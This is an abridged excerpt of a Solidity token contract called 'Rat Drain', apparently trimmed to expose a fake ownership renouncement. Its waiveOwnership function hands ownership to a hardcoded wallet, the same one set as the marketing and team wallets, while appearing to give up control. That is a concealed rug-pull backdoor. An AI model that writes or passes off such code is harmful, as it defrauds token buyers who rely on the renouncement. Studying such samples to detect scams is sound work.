...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8095f15C5C7EB01931092500386b33b5ED918d69);
    }
...
contract RatDrain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Rat Drain";
    string private _symbol = "RTDN";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x8095f15C5C7EB01931092500386b33b5ED918d69);
    address payable private teamWalletAddress = payable(0x8095f15C5C7EB01931092500386b33b5ED918d69);
